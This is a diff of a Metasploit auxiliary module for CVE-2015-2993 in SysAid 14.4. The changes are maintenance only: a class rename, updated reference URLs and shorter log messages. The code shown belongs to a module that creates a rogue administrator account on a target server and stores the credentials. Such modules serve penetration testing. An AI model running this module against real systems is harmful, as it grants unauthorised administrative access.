@@ -5,7 +5,7 @@
 
 require 'msf/core'
 
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
 
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
@@ -27,8 +27,8 @@ class Metasploit3 < Msf::Auxiliary
       'References' =>
         [
           [ 'CVE', '2015-2993' ],
-          [ 'URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/generic/sysaid-14.4-multiple-vulns.txt' ],
-          [ 'URL', 'http://seclists.org/fulldisclosure/2015/Jun/8' ]
+          [ 'URL', 'http://seclists.org/fulldisclosure/2015/Jun/8' ],
+          [ 'URL', 'https://github.com/pedrib/PoC/blob/master/advisories/sysaid-14.4-multiple-vulns.txt' ],
         ],
       'DisclosureDate' => 'Jun 3 2015'))
 
@@ -56,7 +56,7 @@ class Metasploit3 < Msf::Auxiliary
     })
     if res && res.code == 200 && res.body.to_s =~ /Error while creating account/
       # No way to know whether this worked or not, it always says error
-      print_status("#{peer} - The new administrator #{datastore['USERNAME']}:#{datastore['PASSWORD']} should be checked manually")
+      print_status("The new administrator #{datastore['USERNAME']}:#{datastore['PASSWORD']} should be checked manually")
       service_data = {
         address: rhost,
         port: rport,
@@ -82,7 +82,7 @@ class Metasploit3 < Msf::Auxiliary
       login_data.merge!(service_data)
       create_credential_login(login_data)
     else
-      print_error("#{peer} - Administrator account creation failed")
+      print_error("Administrator account creation failed")
     end
   end
 end
